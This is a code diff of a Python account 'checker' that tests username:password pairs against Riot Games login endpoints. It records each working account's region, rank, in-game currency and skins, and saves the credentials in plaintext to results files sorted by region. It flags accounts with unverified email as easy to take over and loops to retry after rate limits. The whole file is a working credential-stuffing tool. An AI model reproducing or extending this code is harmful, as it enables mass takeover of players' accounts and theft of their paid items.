@@ -3,11 +3,14 @@ import requests
 from requests.adapters import HTTPAdapter
 from ssl import PROTOCOL_TLSv1_2
 from urllib3 import PoolManager
+from tkinter import *
 from collections import OrderedDict
 from re import compile
 from cryptocode import decrypt
 import ctypes
 import os
+import time
+from colorama import Fore
 
 
 class TLSAdapter(HTTPAdapter):
@@ -65,17 +68,30 @@ def checker():
         token = data[0]
     elif "auth_failure" in r2.text:
         print("banned")
+        banneds = open("results//banned.txt", "a+")
+        banneds.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Type: banned\n")
+        banneds.close()
+        time.sleep(3)
+        checker()
 
     elif "rate_limited" in r2.text:
         print("Ratelimited")
+        checker()
 
-
-    headers = {
-        'User-Agent': 'RiotClient/51.0.0.4429735.4381201 rso-auth (Windows;10;;Professional, x64)',
-        'Authorization': f'Bearer {token}',
-    }
-    r = session.post('https://entitlements.auth.riotgames.com/api/token/v1', headers=headers, json={})
-    entitlement = r.json()['entitlements_token']
+    try:
+        headers = {
+            'User-Agent': 'RiotClient/51.0.0.4429735.4381201 rso-auth (Windows;10;;Professional, x64)',
+            'Authorization': f'Bearer {token}',
+        }
+        r = session.post('https://entitlements.auth.riotgames.com/api/token/v1', headers=headers, json={})
+        entitlement = r.json()['entitlements_token']
+    except:
+            print("banned")
+            banneds = open("results//banned.txt", "a+")
+            banneds.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Type: banned\n")
+            banneds.close()
+            time.sleep(3)
+            checker()
 
     r = session.post('https://auth.riotgames.com/userinfo', headers=headers, json={})
     data = r.json()
@@ -96,9 +112,10 @@ def checker():
     if "region" in GetAccountRegion.text:
         Region = GetAccountRegion.json()["data"]["region"]
         AccountLevel = GetAccountRegion.json()["data"]["account_level"]
-        Lastupdate = GetAccountRegion.json()["data"]["last_update"]
     else:
         print("Fail")
+        Region = "na"
+        AccountLevel = "Unknow"
     PvpNetHeaders = {"Content-Type": "application/json","Authorization": f"Bearer {token}","X-Riot-Entitlements-JWT": entitlement,"X-Riot-ClientVersion": "release-01.08-shipping-10-471230","X-Riot-ClientPlatform": "ew0KCSJwbGF0Zm9ybVR5cGUiOiAiUEMiLA0KCSJwbGF0Zm9ybU9TIjogIldpbmRvd3MiLA0KCSJwbGF0Zm9ybU9TVmVyc2lvbiI6ICIxMC4wLjE5MDQyLjEuMjU2LjY0Yml0IiwNCgkicGxhdGZvcm1DaGlwc2V0IjogIlVua25vd24iDQp9"} 
     try:
         CheckRanked = sess.get(f"https://pd.{Region}.a.pvp.net/mmr/v1/players/{puuid}/competitiveupdates",headers=PvpNetHeaders)
@@ -133,8 +150,26 @@ def checker():
         Skin.clear()
         Skin = "UnKnow"
         SkinStr = "| UnKnow \n"
-    print(f"{username}:{password} | Region: {Region} | Last played: {Lastupdate}| Level: {AccountLevel} | Email Verified: {EmailVerified} | Rank: {Rank} | VP: {ValorantPoints} | RP: {Radianite} | Total Skins: {len(Skin)}")   
-    SaveHits = open("results//Hits.txt", "a+")
-    SaveHits.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Region: {Region}\n| Last played: {Lastupdate}\n| Level: {AccountLevel}\n| Email Verified: {EmailVerified}\n| Rank: {Rank}\n| VP: {ValorantPoints} - RP: {Radianite}\n|-------------[Skins({len(Skin)})]-------------]\n{SkinStr}[-------------------------------------]\n\n")
+    if Region == "eu":
+        euwe = open("results//eu//eu.txt", "a+")
+        euwe.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Region: {Region}\n| Level: {AccountLevel}\n| Email Verified: {EmailVerified}\n| Rank: {Rank}\n| VP: {ValorantPoints} - RP: {Radianite}\n|-------------[Skins({len(Skin)})]-------------]\n{SkinStr}[-------------------------------------]\n\n")
+        euwe.close()
+    if Region == "na":
+        naeuw = open("results//na.txt", "a+")
+        naeuw.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Region: {Region}\n| Level: {AccountLevel}\n| Email Verified: {EmailVerified}\n| Rank: {Rank}\n| VP: {ValorantPoints} - RP: {Radianite}\n|-------------[Skins({len(Skin)})]-------------]\n{SkinStr}[-------------------------------------]\n\n")
+        naeuw.close()
+    if Region == "ap":
+        SaveHits1 = open("results//ap.txt", "a+")
+        SaveHits1.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Region: {Region}\n| Level: {AccountLevel}\n| Email Verified: {EmailVerified}\n| Rank: {Rank}\n| VP: {ValorantPoints} - RP: {Radianite}\n|-------------[Skins({len(Skin)})]-------------]\n{SkinStr}[-------------------------------------]\n\n")
+        SaveHits1.close()
+    if EmailVerified == "false":
+        SaveHits2 = open("results//FA.txt", "a+")
+        SaveHits2.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Region: {Region}\n| Level: {AccountLevel}\n| Email Verified: {EmailVerified}\n| Rank: {Rank}\n| VP: {ValorantPoints} - RP: {Radianite}\n|-------------[Skins({len(Skin)})]-------------]\n{SkinStr}[-------------------------------------]\n\n")
+        SaveHits2.close()
+    print(f"{username}:{password} | Region: {Region} | Level: {AccountLevel} | Email Verified: {EmailVerified} | Rank: {Rank} | VP: {ValorantPoints} | RP: {Radianite} | Total Skins: {len(Skin)}")   
+    SaveHits = open("results//All.txt", "a+")
+    SaveHits.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Region: {Region}\n| Level: {AccountLevel}\n| Email Verified: {EmailVerified}\n| Rank: {Rank}\n| VP: {ValorantPoints} - RP: {Radianite}\n|-------------[Skins({len(Skin)})]-------------]\n{SkinStr}[-------------------------------------]\n\n")
     SaveHits.close()
+    time.sleep(3)
+    checker()
 checker()
